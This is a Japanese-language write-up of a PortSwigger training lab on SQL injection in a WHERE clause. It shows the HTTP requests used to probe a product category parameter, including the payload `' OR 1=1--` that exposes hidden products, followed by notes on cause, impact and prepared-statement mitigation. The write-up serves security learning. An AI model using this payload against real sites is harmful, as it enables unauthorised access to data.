# SQL Injection：WHERE句の条件回避

## 1. 検証概要

**学習環境：** PortSwigger Web Security Academy  
**使用ツール：** Burp Suite Community Edition  
**対象機能：** 商品カテゴリの絞り込み機能  
**対象パラメータ：** `category`  
**結果：** Lab Solved

### 検証目的

商品カテゴリを指定するHTTPリクエストのパラメータを変更し、SQLインジェクションによって本来取得できない非公開商品を取得できるか検証する。

## 2. 検証手順と結果

### ① 正常なリクエスト

```http
GET /filter?category=Food+%26+Drink HTTP/2
```

結果：`200 OK`

通常の商品カテゴリの絞り込みが動作することを確認した。

### ② シングルクォートによる検証

```http
GET /filter?category=Food+%26+Drink' HTTP/2
```

結果：`500 Internal Server Error`

シングルクォートを追加するとサーバー内部エラーが発生した。

この結果から、入力値がSQL文の構文に影響している可能性を考えた。

### ③ SQLコメントによる検証

```http
GET /filter?category=Food+%26+Drink'-- HTTP/2
```

結果：`200 OK`

SQLコメントを追加すると正常なレスポンスに戻った。

### ④ 条件式の変更

```http
GET /filter?category=Food+%26+Drink'+OR+1=1-- HTTP/2
```

結果：`200 OK`

通常のカテゴリ表示と比較して商品数が増加した。

また、PortSwiggerのラボが `Solved` になったことを確認した。

## 3. 原因の考察

今回の脆弱性は、ユーザーから受け取ったカテゴリの値が、SQL文の構造を変更できる形で組み込まれているために発生すると考えられる。

`OR 1=1` によってWHERE句の条件を常に真にし、`--` によって後続のSQLをコメントアウトすることで、公開状態の絞り込みを回避できた。

※ SQL文の実装そのものは確認していないため、内部の処理についてはラボの仕様と検証結果に基づく考察である。

## 4. 想定される影響

- 非公開の商品情報が取得される
- 本来の検索条件による制限が回避される
- アプリケーションの実装によっては、ほかのデータへの不正アクセスにつながる可能性がある

## 5. 推奨対策

**プリペアドステートメント（パラメータ化クエリ）の利用**

ユーザー入力をSQL文の構造として解釈させず、データとして安全に扱う。

加えて、データベース接続アカウントの権限を必要最小限にする。

## 6. 学習したこと

今回の検証では、入力フォームが存在しなくても、HTTPリクエストのパラメータを変更することで脆弱性を検証できると学んだ。

Burp SuiteのHTTP historyで通信を確認し、Repeaterでリクエストを編集・再送信する基本操作を実践した。

今後は、SQLのWHERE句やコメント構文について理解を深め、ペイロードがSQL文にどのような影響を与えるか、自分で説明できるようにしたい。

## 7. 参考資料

[PortSwigger Web Security Academy：SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
